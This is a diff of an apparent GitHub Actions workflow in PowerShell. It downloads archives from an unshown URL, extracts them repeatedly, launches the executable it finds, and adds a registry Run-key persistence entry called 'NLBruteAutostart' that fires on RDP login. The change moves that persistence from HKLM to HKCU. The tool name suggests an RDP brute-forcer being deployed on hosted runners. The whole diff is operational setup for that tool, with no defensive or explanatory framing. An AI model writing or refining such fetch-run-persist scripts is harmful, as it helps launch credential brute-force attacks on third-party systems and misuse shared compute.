@@ -68,7 +68,7 @@ jobs:
               Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
           }
 
-          # 4. Deep Extraction Loop (Recursive)
+          # 4. Deep Extraction Loop
           Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
           $maxIterations = 5
           $iteration = 0
@@ -99,19 +99,26 @@ jobs:
               $exeDir = Split-Path $exePath -Parent
               Write-Host "SUCCESS! Found: $exePath" -ForegroundColor Green
 
-              # --- THE CRITICAL FIX: REGISTRY STARTUP ---
-              # We inject into HKLM (System wide) so it triggers on ANY login.
-              # We use a CMD wrapper to ensure it changes to the correct directory first.
-              Write-Host "Injecting Registry Autostart..." -ForegroundColor Cyan
-              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-              $command = "cmd.exe /c cd /d `"$exeDir`" && start `"`"$targetExeName`""
+              # --- THE REFINED FIX ---
+              # 1. Use a direct command string without the 'cmd /c start' wrapper which can cause CMD windows to hang.
+              # 2. We use the full path directly in the registry.
+              # 3. We use the 'Run' key for the current user (HKCU) to ensure it's tied to the interactive session.
               
-              # Create the registry key to force the app to run on login
-              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value $command -PropertyType String -Force | Out-Null
+              Write-Host "Configuring Autostart via Registry..." -ForegroundColor Cyan
+              
+              # We will use a PowerShell command inside the registry to ensure the directory is set correctly 
+              # and the app is launched as a clean process.
+              $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+              $launchCommand = "powershell.exe -WindowStyle Normal -Command `"Set-Location '$exeDir'; Start-Process '$targetExeName' -WorkingDirectory '$exeDir' -WindowStyle Normal`""
+              
+              # Create the registry key
+              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value $launchCommand -PropertyType String -Force | Out-Null
               
               Write-Host "Registry configured. The app will launch on RDP Login." -ForegroundColor Green
               
-              # 6. Immediate Launch Attempt (to try and get it running NOW)
+              # 6. Immediate Launch Attempt (Cleaned up)
+              # We launch it once here, but the Registry is the main handler for the RDP session.
+              Write-Host "Triggering immediate launch..." -ForegroundColor Yellow
               Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
               
           } else {
